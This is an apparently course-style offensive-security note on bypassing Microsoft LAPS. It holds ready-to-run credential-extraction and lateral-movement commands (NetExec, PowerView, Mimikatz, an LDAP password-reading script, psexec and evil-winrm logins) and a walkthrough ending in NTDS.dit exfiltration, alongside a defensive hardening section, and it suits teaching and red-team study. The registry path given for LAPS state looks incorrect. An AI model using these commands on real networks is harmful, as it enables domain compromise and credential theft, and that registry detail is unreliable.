---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.12 Bypassing LAPS"
---
# Bypassing LAPS (Local Admin Password Solution)

## 1. Understanding LAPS Architecture and Purpose
The Local Administrator Password Solution (LAPS) is a critical security tool provided by Microsoft. Its primary objective is to mitigate lateral movement vulnerabilities, particularly Pass-the-Hash (PtH), by ensuring that local administrator account passwords on domain-joined computers are unique, highly complex, and regularly rotated. Prior to LAPS, organizations frequently deployed identical local administrator passwords across thousands of endpoints via imaging or Group Policy Preferences (GPP), creating a scenario where compromising a single workstation yielded administrative access to the entire fleet.

LAPS operates through the following mechanisms:
1.  **Client-Side Extension (CSE):** A Group Policy CSE installed on domain-joined endpoints generates a random password locally based on defined complexity requirements.
2.  **Active Directory Storage:** The CSE securely transmits this password to Active Directory, storing it within a confidential attribute (`ms-Mcs-AdmPwd`) associated with the computer's AD object.
3.  **Expiration Tracking:** Concurrently, it updates the password expiration timestamp within the `ms-Mcs-AdmPwdExpirationTime` attribute.
4.  **Access Control:** The security model relies entirely on Active Directory Access Control Lists (ACLs) to restrict which users, groups, or service accounts possess the rights to read the confidential `ms-Mcs-AdmPwd` attribute.

### 1.1 Visualizing the LAPS Workflow
```text
  +-----------------------+                                                +---------------------------+
  |                       |        (1) Generate Password Locally           |                           |
  |  Domain Joined        | ---------------------------------------------> |                           |
  |  Workstation          |                                                |   Active Directory        |
  |  (LAPS CSE Agent)     | <--------------------------------------------- |   Domain Controller       |
  |                       |        (2) Update AD Attributes                |                           |
  +-----------------------+        (ms-Mcs-AdmPwd & ExpirationTime)        |                           |
            ^                                                              +---------------------------+
            |                                                                        |
            | (4) Authenticate via SMB/RDP                                           | (3) Read Attempt
            |     (Using Extracted Password)                                         |     (LDAP Query)
            |                                                                        v
  +-----------------------+                                                +---------------------------+
  |                       | <--------------------------------------------- |                           |
  |     Attacker          |        (Password retrieved if ACL permits      |     Authorized Admin      |
  |                       |         or if misconfiguration exists)         |     (Or Attacker)         |
  +-----------------------+                                                +---------------------------+
```

## 2. Weaknesses and Bypass Strategies
While the architectural concept of LAPS is highly effective, the implementation often falls short. Bypassing LAPS generally does not involve breaking cryptographic implementations but rather exploiting AD design flaws, misconfigurations, and operational realities. These bypasses fall into several distinct categories.

### 2.1 Abuse Vector 1: ACL Misconfigurations (The Most Common Vector)
The foundational security of LAPS dictates that only authorized administrative tiers should possess the rights to read the password attribute. If an attacker compromises an account or group that has been inadvertently granted the `ExtendedRight` to read confidential attributes (specifically `ms-Mcs-AdmPwd`), the LAPS defense is entirely neutralized.

**Common Misconfiguration Scenarios:**
*   **Overly Permissive Groups:** IT Support, Helpdesk Level 1, or inadvertently "Domain Users" are granted read rights at the domain root or overly broad Organizational Units (OUs).
*   **AllExtendedRights:** A user or service account is granted `AllExtendedRights` on an OU. This implicitly grants the ability to read the LAPS password, even if `ms-Mcs-AdmPwd` is not explicitly mentioned.
*   **Stale Permissions:** Legacy service accounts or former administrative groups retain read permissions long after their operational need has ceased.

**Detection and Exploitation Tooling:**
Advanced AD enumeration tools excel at uncovering these misconfigurations.

*Using PowerView to identify unauthorized readers:*
```powershell
# Enumerate users/groups with read access to the LAPS password attribute on a specific OU
Get-DomainObjectAcl -SearchBase "OU=Workstations,DC=corp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq 'ms-Mcs-AdmPwd' -and $_.ActiveDirectoryRights -match 'ReadProperty'}
```

*Using BloodHound:*
BloodHound maps this relationship via the `ReadLAPSPassword` edge. Identifying paths from compromised nodes to computer objects via this edge provides an immediate execution path.

**Extraction Execution:**
If authorized (or misconfigured) rights are possessed, extraction is a simple LDAP query:
```bash
# Using NetExec (formerly CrackMapExec) from a Linux attacking host
nxc ldap dc01.corp.local -u compromised_user -p Password123 --laps
```
```powershell
# Using PowerView from a compromised Windows host
Get-DomainComputer -Identity TARGET-PC | Select-Object Name, ms-Mcs-AdmPwd
```

### 2.2 Abuse Vector 2: Memory Extraction (Post-Compromise)
LAPS aims to prevent lateral movement *to* a machine. However, if an attacker has already obtained SYSTEM or local administrator access to a machine, they may seek the LAPS password to pivot to other machines (if the LAPS password is inappropriately shared, which violates LAPS principles but happens operationally) or to maintain persistence.

Furthermore, if an authorized administrator has recently logged into the machine interactively (e.g., via RDP) using the LAPS local administrator account, the plaintext password or its NTLM hash will reside in LSASS memory.

*   **LSASS Dumping (Mimikatz / NanoDump):**
    ```text
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    ```
    This will reveal the LAPS password if the session is still active or cached.

### 2.3 Abuse Vector 3: Forcing Password Resets (Denial of Service)
If an attacker possesses write access to the `ms-Mcs-AdmPwdExpirationTime` attribute but *lacks* read access to the password itself, they can force a password rotation. 
By setting the expiration time to a timestamp in the past, the LAPS CSE will immediately generate a new password and update AD upon the next Group Policy refresh cycle. This effectively locks out legitimate administrators who are relying on the previously recorded password, serving as a localized Denial of Service or an operational disruption tactic during an active incident.

### 2.4 Abuse Vector 4: Shadow Credentials and RBCD (Bypassing LAPS Entirely)
If an attacker holds `GenericWrite` or `WriteDacl` permissions over a target computer object but cannot directly read the LAPS password, they can bypass the need for the password altogether by leveraging modern AD attack primitives:
*   **Resource-Based Constrained Delegation (RBCD):** Configure the target computer object to trust an attacker-controlled computer account, allowing the forging of Kerberos tickets for administrative access.
*   **Shadow Credentials:** Write a new cryptographic public key to the `msDS-KeyCredentialLink` attribute of the computer object. This allows the attacker to obtain a Ticket Granting Ticket (TGT) for the computer account itself, granting absolute control without interacting with LAPS.

## 3. Windows LAPS (The Next Generation)
In 2023, Microsoft introduced a native, deeply integrated version known as "Windows LAPS", bringing significant architectural enhancements and addressing legacy shortcomings.

### 3.1 Key Advancements in Windows LAPS
*   **Entra ID Integration:** Passwords can now be backed up to Entra ID (Azure AD), bridging the gap for modern, cloud-native endpoints.
*   **Password Encryption in AD:** This is the most crucial enhancement. Passwords stored in AD are now encrypted using DPAPI-NG. Even if a user possesses read rights to the attribute, they retrieve only ciphertext unless they are explicitly authorized to decrypt it.
*   **DSRM Password Management:** Native support for rotating Directory Services Restore Mode (DSRM) passwords on Domain Controllers.
*   **Post-Authentication Actions:** The ability to automatically rotate the password or log off users after the LAPS account is utilized.

### 3.2 Attacking Windows LAPS
The introduction of encrypted passwords significantly raises the barrier to entry. Simply possessing `ReadProperty` is no longer sufficient.
To decrypt the payload, an attacker must compromise an account that belongs to the specific decryption group defined by the Windows LAPS configuration.

If an attacker compromises an authorized decryptor, extraction is performed via native cmdlets:
```powershell
# Extracting and decrypting from Entra ID
Get-LapsAADPassword -ComputerName TARGET-PC

# Extracting and decrypting from on-premises AD
Get-LapsADPassword -Identity TARGET-PC
```

## 4. Defense, Mitigation, and Hardening Strategies
1.  **Strict ACL Auditing:** Organizations must aggressively and continuously audit AD ACLs using tools like BloodHound Enterprise or PingCastle. Ensure that only tier-appropriate administrative groups can read LAPS passwords.
2.  **Tiered Administration Enforcement:** Adhere to AD Tiering principles. Helpdesk personnel (Tier 2) should only have read access to workstation LAPS passwords. Server administrators (Tier 1) should never have read access to Domain Controller LAPS passwords.
3.  **Migrate to Windows LAPS:** Organizations should prioritize migrating from legacy LAPS to the native Windows LAPS, explicitly enabling the password encryption feature to neutralize the threat of overly permissive read rights.
4.  **Proactive Monitoring and Alerting:** Enable AD object auditing for read operations on the `ms-Mcs-AdmPwd` attribute. Forward Event ID 4662 to the SIEM. Construct behavioral alerts for access originating from non-administrative IP subnets, unapproved service accounts, or sudden spikes in retrieval volume.

## 5. Practical Walkthrough: The LAPS Read Escalation
1.  **Initial Foothold:** The Red Team successfully phishes a standard corporate user, "J.Doe".
2.  **BloodHound Enumeration:** `SharpHound.exe` is executed. The resulting graph analysis reveals that J.Doe is a member of a nested group, "IT_Support_T1".
3.  **Path Identification:** The "IT_Support_T1" group erroneously possesses the `ReadLAPSPassword` edge against the `OU=Core_Servers`. This represents a critical architectural flaw.
4.  **Execution Phase:** The attacker queries LDAP directly.
    ```bash
    netexec ldap dc01.corp.local -u J.Doe -p 'Winter2024!' --laps
    ```
5.  **Output Retrieval:** NetExec retrieves the plaintext password.
    `SRV-DB-01$ : Administrator : P@ssw0rd123-Random!`
6.  **Lateral Movement and Objective:** The attacker utilizes the extracted local administrator password to authenticate via SMB to the database server, bypassing network segmentation controls.
    ```bash
    impacket-psexec corp.local/Administrator:'P@ssw0rd123-Random!'@SRV-DB-01
    ```

## 6. LAPS Registry and File Artifacts
During an engagement, it's worth checking the local registry for LAPS state if direct LDAP reading isn't possible:
`HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\CMGShield`
The LAPS client log can also be found in the event viewer under `Applications and Services Logs -> LAPS`.

## 7. Chaining Opportunities
*   [[14 - GPO Abuse at Scale]] - Attackers possessing GPO modification rights can manipulate the LAPS configuration to point to a rogue organizational unit or disable the CSE entirely.
*   [[15 - DPAPI and DPAPI-NG Master Key Extraction]] - If Windows LAPS is implemented with encrypted passwords, extracting DPAPI-NG Key Distribution Service (KDS) Root Keys is the ultimate method to achieve global offline decryption.
*   [[11 - Exchange Web Services EWS Abuse]] - Discovered Helpdesk credentials via EWS searches frequently lead directly to accounts possessing LAPS read privileges.

## 8. Related Notes
*   [[02 - BloodHound Advanced Cypher Queries]]
*   [[09 - Resource Based Constrained Delegation]]
*   [[24 - Active Directory Access Control Lists ACLs]]
*   [[20 - Lateral Movement Techniques]]

## Real-World Attack Scenario
## Real-World Attack Scenario: Bypassing Windows LAPS

**1. Context and Environment:**
The target environment is a large financial institution that has deployed Microsoft Local Administrator Password Solution (LAPS) across all 5,000+ endpoints to mitigate lateral movement and Pass-the-Hash attacks. The organization stores LAPS passwords in Active Directory. The attacker has compromised an IT Support technician's workstation and possesses their active session token, but the user does not have global Domain Admin privileges.

**2. Attacker Thought Process:**
"LAPS is designed to prevent me from taking one local admin password and using it everywhere. However, LAPS relies entirely on Active Directory permissions (ACLs) to dictate who can read the `ms-Mcs-AdmPwd` attribute. Since my compromised account belongs to the 'Tier-1 Helpdesk' group, they likely have delegated permissions to read these passwords for troubleshooting purposes. If I can enumerate the OUs where this group has read access, I can extract the LAPS passwords for those machines and use them to pivot to higher-value targets."

**3. Reconnaissance and Enumeration:**
The attacker uses BloodHound and the active user's context to map out Active Directory ACLs. They specifically look for the `ReadLAPSPassword` edge originating from the compromised IT Support group.
```powershell
# Using SharpHound from the compromised workstation
.\SharpHound.exe -c All,ACL -d corp.local
```
Analyzing the data in the BloodHound GUI, they discover that the 'Tier-1 Helpdesk' group has been inadvertently granted read access to the LAPS passwords of the 'Infrastructure_Servers' OU, which includes internal backup servers.

**4. Exploitation and Execution:**
Knowing they have the authorization, the attacker bypasses the graphical LAPS UI, which might be monitored, and directly queries the LDAP directory using built-in PowerShell commands to extract the cleartext LAPS password of a critical backup server (`BACKUP-SRV01`).
```powershell
# Querying AD directly for the LAPS password
$TargetComputer = "BACKUP-SRV01"
$Searcher = [adsisearcher]"(sAMAccountName=$TargetComputer$)"
$Searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd") | Out-Null
$Result = $Searcher.FindOne()
$LapsPassword = $Result.Properties["ms-mcs-admpwd"][0]
Write-Host "Password for $TargetComputer is: $LapsPassword"
```
The command successfully returns the complex, randomly generated password.

**5. Post-Exploitation and Outcome:**
With the local administrator password for `BACKUP-SRV01` in hand, the attacker uses `evil-winrm` or WMI to establish a remote session to the backup server. 
```bash
evil-winrm -i 10.50.20.15 -u Administrator -p 'v#9L!qZ2$x'
```
Once on the backup server, they find stored backup catalogs containing snapshots of the Domain Controller's NTDS.dit file. They exfiltrate the backup, extract the NTDS.dit offline, and dump all domain hashes, achieving total domain compromise without ever needing to directly exploit a Domain Controller.

